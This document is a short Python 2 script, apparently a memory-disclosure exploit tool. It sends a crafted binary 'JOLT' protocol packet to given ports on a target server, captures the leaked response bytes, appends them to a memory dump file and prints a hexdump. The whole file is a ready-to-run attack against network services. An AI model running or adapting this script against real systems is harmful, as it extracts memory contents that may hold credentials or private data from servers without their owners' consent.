#!/usr/bin/env python
import sys
import argparse
import socket
import time
from hexdump import hexdump
import select

__version__ = "0.1"
__author__ = "@ret5et"


parser = argparse.ArgumentParser()
parser.add_argument("-s","--server", type=str, help="ip adress", default="127.0.0.1")
parser.add_argument("-p","--port", type=int, help="jolt", nargs="+")
parser.add_argument("-d","--dump", type=str, help="name of memory dump file")
args = parser.parse_args()


data = 'JOLT\x00\x00\x00\x0f\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x002\x00\x00\x00\x00'

ports = args.port
ip = args.server
dumpfile = args.dump


def dump (data, filename):
    with open(filename,"ab") as fd:
        fd.write(data)

def _read(sock):
    resp = ''

    while True:
        try:
            r = sock.recv(1)
        except socket.error, e:
            break;

        if not r:
            break

        resp += r
        if len(resp)  >= 2000:
            sock.close()
    return resp


def mainloop (port):
    cnt = 0
    while True:

        try:
            s = socket.create_connection((ip,port),1)
        except socket.error:
            break

        s.sendall(data)

        try:
            resp = _read(s)
            dump(resp,dumpfile)
        except KeyboardInterrupt:
            print "Exit ..."
            break
        finally:
            s.close()
            pass

        if resp:
            hexdump(resp)
            cnt +=1
            s.close()
            break

for port in ports:
    mainloop(port)
print "Done\n"
